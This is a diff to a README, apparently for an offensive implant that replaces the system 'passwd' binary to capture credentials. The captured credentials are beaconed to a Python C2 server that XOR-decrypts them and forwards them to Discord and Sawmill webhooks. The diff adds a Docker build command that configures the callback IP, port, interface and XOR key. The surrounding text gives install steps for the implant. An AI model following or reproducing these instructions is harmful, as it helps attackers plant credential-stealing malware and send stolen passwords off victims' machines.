@@ -43,6 +43,9 @@ Parameter definitions :
 ### Install
 To install the implant it is easy as replacing the original `passwd` binary on the system with the shimmed binary. Common location for this binary is `/usr/bin/passwd` and `/bin/passwd`. <br><br>
 
+## Building with Docker
+	docker build . -f ubuntu2204.Dockerfile -o ./out --no-cache --rm --build-arg IP="192.168.1.1" --build-arg PORT="1234" --build-arg INTERFACE="ens2" --build-arg XOR_KEY="bruh"arch:latest 
+
 ## Using the Python C2
 This tool includes a simple server to recieve the credentals beaconed by the binary. This includes XOR decryption, parsing, and forwarding to a Discord and Sawmill webhook. 
 
